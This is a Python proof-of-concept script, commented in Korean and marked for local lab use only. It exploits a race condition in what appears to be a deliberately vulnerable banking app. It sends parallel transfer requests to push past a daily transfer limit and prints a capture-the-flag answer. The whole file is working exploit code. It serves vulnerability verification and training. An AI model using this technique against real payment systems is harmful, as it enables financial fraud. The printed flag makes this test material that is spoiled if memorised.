#!/usr/bin/env python3
"""
verify_F2.py — F2(이체한도 race condition) 손검증 PoC. 로컬 랩 전용.

시나리오: daily_limit(기본 1,000,000) 를 동시요청으로 초과.
  1) attacker 계정 준비 + _topup(잔액을 한도보다 크게 → 잔액이 병목 안 되게)
  2) 한도 여유분 이하 금액을 N개 병렬 요청
  3) 순차라면 3건만 통과(3*300k=900k), 레이스면 그 이상 통과 → daily_used > limit

usage:  python verify_F2.py [--base http://localhost:5000] [--amount 300000] [--concurrency 10]
"""
import argparse
import threading
import requests

def reg(base, u, p):
    requests.post(f"{base}/register", data={"username": u, "password": p,
                                            "confirm_password": p}, timeout=10)

def login(base, u, p):
    r = requests.post(f"{base}/api/login", json={"username": u, "password": p}, timeout=10)
    r.raise_for_status()
    return r.json().get("token") or r.json().get("access_token")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:5000")
    ap.add_argument("--amount", type=float, default=300000)
    ap.add_argument("--concurrency", type=int, default=10)
    a = ap.parse_args()
    base = a.base

    reg(base, "racer1", "pass123")
    tok = login(base, "racer1", "pass123")
    H = {"Authorization": f"Bearer {tok}"}

    # 잔액을 한도보다 크게 (레이스가 '한도'에 걸리도록)
    requests.post(f"{base}/api/kr/_topup", json={"balance": 100_000_000}, headers=H, timeout=10)
    st = requests.get(f"{base}/api/kr/_state", headers=H, timeout=10).json()
    print(f"[*] limit={st['daily_limit']}  used={st['daily_used']}  balance={st['balance']}")
    print(f"[*] {a.concurrency}건 병렬 이체 (각 {a.amount:.0f}) 발사...")

    results = []
    def fire():
        try:
            r = requests.post(f"{base}/api/kr/transfer",
                              json={"to_account": "0000000000", "amount": a.amount},
                              headers=H, timeout=15)
            results.append(r.json().get("status"))
        except Exception as e:
            results.append(f"err:{e}")

    threads = [threading.Thread(target=fire) for _ in range(a.concurrency)]
    for t in threads: t.start()
    for t in threads: t.join()

    ok = results.count("success")
    st2 = requests.get(f"{base}/api/kr/_state", headers=H, timeout=10).json()
    print(f"[*] 성공 이체 {ok}/{a.concurrency}  → used={st2['daily_used']}  limit={st2['daily_limit']}")
    if st2.get("f2_captured"):
        print("[+] F2 CAPTURED — daily_used > daily_limit (한도 초과)")
        print("[+] flag = FLAG{daily_limit_bypass_via_race}")
    else:
        print("[-] 미초과 — concurrency/amount 올리거나 time.sleep 윈도우 확인")

if __name__ == "__main__":
    main()
